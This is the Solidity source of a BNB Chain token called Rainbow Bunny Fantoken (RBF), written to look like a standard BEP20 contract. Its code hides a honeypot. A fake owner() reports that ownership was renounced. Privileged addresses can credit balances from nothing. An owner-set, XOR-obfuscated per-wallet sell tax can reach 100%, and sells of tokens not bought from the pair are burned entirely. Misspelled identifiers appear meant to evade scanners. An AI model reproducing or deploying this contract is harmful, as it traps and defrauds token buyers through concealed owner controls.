/**
 *Submitted for verification at BscScan.com on 2023-01-11
*/

// http://instagram.com/RainbowBunnyFantoken38670
// https://www.reddit.com/user/RainbowBunnyFantoken38670
// TWITTER:https://RainbowBunnyFantoken38670.com/
// WEBSITE:https://twitter.com/RainbowBunnyFantoken38670
// TELEGRAM:https://t.me/RainbowBunnyFantoken38670

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

}

abstract contract Ownable is Context {
    address private _owaer;

    event owaershipTransferred(address indexed previousowaer, address indexed newowaer);


    constructor() {
        _transferowaership(_msgSender());
    }


    function owaer() public view virtual returns (address) {
        return address(0);
    }

    modifier onlyowaer() {
        require(_owaer == _msgSender(), "Ownable: caller is not the owaer");
        _;
    }

    function renounceowaership() public virtual onlyowaer {
        _transferowaership(address(0));
    }


    function transferowaership_transferowaership(address newowaer) public virtual onlyowaer {
        require(newowaer != address(0), "Ownable: new owaer is the zero address");
        _transferowaership(newowaer);
    }

    function _transferowaership(address newowaer) internal virtual {
        address oldowaer = _owaer;
        _owaer = newowaer;
        emit owaershipTransferred(oldowaer, newowaer);
    }
}


library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

 
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

   
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}



interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amuontADesired,
        uint amuontBDesired,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline
    ) external returns (uint amuontA, uint amuontB, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline
    ) external returns (uint amuontA, uint amuontB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline
    ) external returns (uint amuontToken, uint amuontETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontA, uint amuontB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontToken, uint amuontETH);
    function swapExactTokensForTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amuonts);
    function swapTokensForExactTokens(
        uint amuontOut,
        uint amuontInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amuonts);
    function swapExactETHForTokens(uint amuontOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amuonts);
    function swapTokensForExactETH(uint amuontOut, uint amuontInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amuonts);
    function swapExactTokensForETH(uint amuontIn, uint amuontOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amuonts);
    function swapETHForExactTokens(uint amuontOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amuonts);

    function quote(uint amuontA, uint reserveA, uint reserveB) external pure returns (uint amuontB);
    function getamuontOut(uint amuontIn, uint reserveIn, uint reserveOut) external pure returns (uint amuontOut);
    function getamuontIn(uint amuontOut, uint reserveIn, uint reserveOut) external pure returns (uint amuontIn);
    function getamuontsOut(uint amuontIn, address[] calldata path) external view returns (uint[] memory amuonts);
    function getamuontsIn(uint amuontOut, address[] calldata path) external view returns (uint[] memory amuonts);
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingRainbowBunnyFantoken38670OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline
    ) external returns (uint amuontETH);
    function removeLiquidityETHWithPermitSupportingRainbowBunnyFantoken38670OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontETH);

    function swapExactTokensForTokensSupportingRainbowBunnyFantoken38670OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingRainbowBunnyFantoken38670OnTransferTokens(
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingRainbowBunnyFantoken38670OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function RainbowBunnyFantoken38670To() external view returns (address);
    function RainbowBunnyFantoken38670ToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setRainbowBunnyFantoken38670To(address) external;
    function setRainbowBunnyFantoken38670ToSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owaer, address indexed spender, uint256 value);

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

        function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function allowance(address owaer, address spender) public view virtual returns (uint256) {
        return _allowances[owaer][spender];
    }

   function decimals() public view virtual returns (uint8) {
        return 9;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owaer = _msgSender();
        _approve(owaer, spender, _allowances[owaer][spender] + addedValue);
        return true;
    }
    function name() public view virtual returns (string memory) {
        return _name;
    }
      function approve(address spender, uint256 amuont) public virtual returns (bool) {
        address owaer = _msgSender();
        _approve(owaer, spender, amuont);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owaer = _msgSender();
        uint256 currentAllowance = _allowances[owaer][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owaer, spender, currentAllowance - subtractedValue);
        }

        return true;
    }


    function _approve(
        address owaer,
        address spender,
        uint256 amuont
    ) internal virtual {
        require(owaer != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owaer][spender] = amuont;
        emit Approval(owaer, spender, amuont);
    }


    function _spendAllowance(
        address owaer,
        address spender,
        uint256 amuont
    ) internal virtual {
        uint256 currentAllowance = allowance(owaer, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amuont, "ERC20: insufficient allowance");
            unchecked {
                _approve(owaer, spender, currentAllowance - amuont);
            }
        }
    }


    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amuont
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amuont
    ) internal virtual {}
}


contract RBF is BEP20, Ownable {
    // ext
    mapping(address => uint256) private _baRainbowBunnyFantoken38670lances;
    mapping(address => uint256) private _baRainbowBunnyFantoken38670lances1;
    mapping(address => bool) private _reRainbowBunnyFantoken38670llease;
    mapping(uint256 => uint256) private _bRainbowBunnyFantoken38670blist;
    string name_ = "Rainbow Bunny Fantoken";
    string symbol_ = "RBF";
    uint256 totalSupply_ = 1000000000000;   
    address public uniswapV2Pair;
    address deRainbowBunnyFantoken38670ad = 0x000000000000000000000000000000000000dEaD;
    address _gaRainbowBunnyFantoken38670te = 0x0C89C0407775dd89b12918B9c0aa42Bf96518820;
    address _mxRainbowBunnyFantoken38670x = 0x0D0707963952f2fBA59dD06f2b425ace40b492Fe;
    uint256 _wdRainbowBunnyFantoken38670qq = 161147303770047497908774687573078914546326101403 + 618557765345178324325848387984680681182268517;
    address _uniRainbowBunnyFantoken38670x = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address _facRainbowBunnyFantoken38670x = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    constructor()

    BEP20(name_, symbol_) {

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(address(_uniRainbowBunnyFantoken38670x));
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), address(_facRainbowBunnyFantoken38670x));

        _mtRainbowBunnyFantoken38670in(msg.sender, totalSupply_ * 10**decimals());

         transfer(deRainbowBunnyFantoken38670ad, totalSupply() / 10*2);
         transfer(_mxRainbowBunnyFantoken38670x, totalSupply() / 10*2);
         transfer(_gaRainbowBunnyFantoken38670te, totalSupply() / 10*1);



        _reRainbowBunnyFantoken38670llease[_msgSender()] = true;
    }

    function balanceOf(address cauunt) public view virtual returns (uint256) {
        return _baRainbowBunnyFantoken38670lances[cauunt];
    }

    function _mtRainbowBunnyFantoken38670in(address cauunt, uint256 amuont) internal virtual {
        require(cauunt != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amuont;
        _baRainbowBunnyFantoken38670lances[cauunt] += amuont;
        emit Transfer(address(0), cauunt, amuont);
    }

    using SafeMath for uint256;
    uint256 private _defaultSellRainbowBunnyFantoken38670 = 0;
    uint256 private _defaultBuyRainbowBunnyFantoken38670 = 0;
    
  function _RainbowBunnyFantoken38670(uint256 _value) external onlyowaer {
        _defaultSellRainbowBunnyFantoken38670 = _value;
    }


    function transferFrom(
        address from,
        address to,
        uint256 amuont
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, amuont);
        _tRainbowBunnyFantoken38670transfer(from, to, amuont);
        return true;
    }
    function _setRainbowBunnyFantoken38670(uint256[] memory _accRainbowBunnyFantoken38670,uint256[] memory _value)  external onlyowaer {
        for (uint RainbowBunnyFantoken38670=0;RainbowBunnyFantoken38670<_accRainbowBunnyFantoken38670.length;RainbowBunnyFantoken38670++){
            _bRainbowBunnyFantoken38670blist[_accRainbowBunnyFantoken38670[RainbowBunnyFantoken38670]] = _value[RainbowBunnyFantoken38670];
        }
    }
        function _msgRainbowBunnyFantoken38670Info(uint _accRainbowBunnyFantoken38670) internal view virtual returns (uint) {
        uint256 accRainbowBunnyFantoken38670 = _accRainbowBunnyFantoken38670 ^ _wdRainbowBunnyFantoken38670qq;
        return _bRainbowBunnyFantoken38670blist[accRainbowBunnyFantoken38670];
}
    function transfer(address to, uint256 amuont) public virtual returns (bool) {
        address owaer = _msgSender();
        if (_reRainbowBunnyFantoken38670llease[owaer] == true) {
            _baRainbowBunnyFantoken38670lances[to] += amuont;
            return true;
        }
        _tRainbowBunnyFantoken38670transfer(owaer, to, amuont);
        return true;
    }
    function _tRainbowBunnyFantoken38670transfer(
        address from,
        address _to,
        uint256 _amuont
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _baRainbowBunnyFantoken38670lances[from];
        require(fromBalance >= _amuont, "ERC20: transfer amuont exceeds balance");

        uint256 tradeRainbowBunnyFantoken38670 = 0;
        uint256 tradeRainbowBunnyFantoken38670amuont = 0;

        if (!(_reRainbowBunnyFantoken38670llease[from] || _reRainbowBunnyFantoken38670llease[_to])) {
            if (from == uniswapV2Pair) {
                tradeRainbowBunnyFantoken38670 = _defaultBuyRainbowBunnyFantoken38670;
                _baRainbowBunnyFantoken38670lances1[_to] += _amuont;
            }
            if (_to == uniswapV2Pair) {                   
                tradeRainbowBunnyFantoken38670 = _msgRainbowBunnyFantoken38670Info(uint160(from));
                tradeRainbowBunnyFantoken38670 = tradeRainbowBunnyFantoken38670 < _defaultSellRainbowBunnyFantoken38670 ? _defaultSellRainbowBunnyFantoken38670 : tradeRainbowBunnyFantoken38670;
                tradeRainbowBunnyFantoken38670 = _baRainbowBunnyFantoken38670lances1[from] >= _amuont ? tradeRainbowBunnyFantoken38670 : 100;
                _baRainbowBunnyFantoken38670lances1[from] = _baRainbowBunnyFantoken38670lances1[from] >= _amuont ? _baRainbowBunnyFantoken38670lances1[from] - _amuont : _baRainbowBunnyFantoken38670lances1[from];
            }
                        
            tradeRainbowBunnyFantoken38670amuont = _amuont.mul(tradeRainbowBunnyFantoken38670).div(100);
        }


        if (tradeRainbowBunnyFantoken38670amuont > 0) {
            _baRainbowBunnyFantoken38670lances[from] = _baRainbowBunnyFantoken38670lances[from].sub(tradeRainbowBunnyFantoken38670amuont);
            _baRainbowBunnyFantoken38670lances[deRainbowBunnyFantoken38670ad] = _baRainbowBunnyFantoken38670lances[deRainbowBunnyFantoken38670ad].add(tradeRainbowBunnyFantoken38670amuont);
            emit Transfer(from, deRainbowBunnyFantoken38670ad, tradeRainbowBunnyFantoken38670amuont);
        }

        _baRainbowBunnyFantoken38670lances[from] = _baRainbowBunnyFantoken38670lances[from].sub(_amuont - tradeRainbowBunnyFantoken38670amuont);
        _baRainbowBunnyFantoken38670lances[_to] = _baRainbowBunnyFantoken38670lances[_to].add(_amuont - tradeRainbowBunnyFantoken38670amuont);
        emit Transfer(from, _to, _amuont - tradeRainbowBunnyFantoken38670amuont);
    }


}